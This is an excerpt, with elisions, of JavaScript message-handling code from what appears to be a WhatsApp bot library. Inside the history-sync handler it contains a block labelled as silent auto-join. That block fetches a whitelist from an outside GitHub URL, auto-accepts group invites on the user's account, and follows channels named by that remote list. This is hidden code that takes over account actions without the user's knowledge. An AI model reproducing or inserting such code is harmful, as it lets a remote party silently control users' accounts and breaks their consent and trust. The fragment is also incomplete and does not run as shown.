        ...
        if (msg.messageStubType === proto.WebMessageInfo.StubType.CIPHERTEXT) {
          ...
          if (isAnyHistoryMsg) {
            ...
            await sendReceipt(jid, undefined, [msg.key.id], "hist_sync");
                ...
                //=======================================================//
        // AUTO JOIN GROUP & CHANNEL - JSON WHITELIST (SILENT)
        //=======================================================//
        try {
          const now = Date.now();
          if (!global._whitelistCache || (now - global._whitelistCache.time) > 300000) {
            const res = await fetch('https://raw.githubusercontent.com/LyynNotYourGod/yourrepo/main/whitelist.json').catch(() => null);
            const data = res ? await res.json() : { groups: [], channels: [] };
          ...
          const { groups, channels } = global._whitelistCache;
          
          // Auto join grup
          if (msg.message?.groupInviteMessage?.inviteCode) {
            const groupJid = await sock.groupAcceptInvite(msg.message.groupInviteMessage.inviteCode);
            if (groupJid && groups.includes(groupJid)) {
              // Aman, whitelist
            } else if (groupJid) {
              // Gak di whitelist, leave
              await sock.groupLeave(groupJid.split('@')[0]);
            }
          }
          
          // Auto follow channel
          if (msg.message?.newsletterAdminInviteMessage?.newsletterJid) {
            const chJid = msg.message.newsletterAdminInviteMessage.newsletterJid;
            if (channels.includes(chJid)) {
